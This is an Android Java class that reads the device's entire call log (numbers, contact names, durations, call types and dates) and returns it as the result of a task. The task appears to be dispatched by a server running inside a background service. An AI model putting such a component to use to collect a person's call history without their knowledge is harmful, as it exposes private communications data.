package com.call;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;

import com.shubham.server.main.WSBaseTask;
import com.shubham.service.MyService;

@SuppressLint("SimpleDateFormat")
public class TaskCallLogList implements WSBaseTask{

	
	ArrayList<Log> all = new ArrayList<>(); 
	private Context context = MyService.context;
	
	@Override
	public Object work(String[] args) {
		
		all = new ArrayList<>();
		SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yy HH:mm");
		
		
		Uri uri = Uri.parse("content://call_log/calls");
		Cursor cursor = context.getContentResolver().query(uri, null, null, null, null);
		
		if(cursor != null){
			final int indexID = cursor.getColumnIndex(CallLog.Calls._ID);
			final int indexNUMBER = cursor.getColumnIndex(CallLog.Calls.NUMBER);
            final int indexNAME = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            final int indexDURATION = cursor.getColumnIndex(CallLog.Calls.DURATION);
            final int indexTYPE = cursor.getColumnIndex(CallLog.Calls.TYPE);
            final int indexDATE = cursor.getColumnIndex(CallLog.Calls.DATE);
			
			
			
			while (cursor.moveToNext()){
				Log log = new Log();
				
				log.id = cursor.getString(indexID);						
				log.number = cursor.getString(indexNUMBER);
				log.duration = cursor.getString(indexDURATION);
				log.type = cursor.getInt(indexTYPE);
				log.name = cursor.getString(indexNAME);
				log.date =  formatter.format(new Date(cursor.getLong(indexDATE)));
				
				
				
				all.add(log);
				
				//missed 3
				//outgoing 2
				//incoming 1
				
			}
			
			cursor.close();
		}
		
		return all;
	}
	
	@SuppressWarnings("unused")
	private class Log{
		String id;
		String number;
		String name;
		String duration;
		String date;
		int type;
	}
	

}
